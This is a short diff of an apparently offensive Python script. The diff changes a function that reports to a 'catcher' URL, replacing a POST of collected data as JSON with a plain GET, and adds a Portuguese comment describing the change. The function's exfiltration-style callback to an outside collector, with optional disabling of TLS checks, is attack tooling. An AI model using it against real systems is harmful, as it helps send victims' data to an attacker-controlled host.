@@ -1,3 +1,4 @@
+# esse ta mandando um get e pegando a response
 import requests
 import os
 from urllib3.exceptions import InsecureRequestWarning
@@ -42,7 +43,7 @@ def send_data_to_catcher(data, use_ssl):
     if not use_ssl:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     try:
-        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
+        response = requests.get(catcher_URL, timeout=3, verify=use_ssl)
         print("[+] Data sent to the catcher.")
     except requests.RequestException:
         print(f"[-] Failed to send data to the catcher.")
